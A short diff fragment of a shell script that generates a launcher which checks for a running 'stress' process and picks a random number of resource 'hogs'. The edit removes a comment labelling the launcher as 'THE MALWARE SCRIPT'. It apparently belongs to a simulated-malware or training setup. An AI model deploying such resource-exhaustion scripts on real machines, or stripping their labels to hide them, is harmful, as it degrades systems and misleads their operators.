@@ -9,9 +9,6 @@ function generate_launcher() {
 cat > $1 << EOF
 #!/bin/sh
 
-######################################
-##### THIS IS THE MALWARE SCRIPT #####
-
 if (pgrep stress &>/dev/null); then exit; fi
 
 HOGS=\$(( (\$RANDOM % 3) + 1 ))
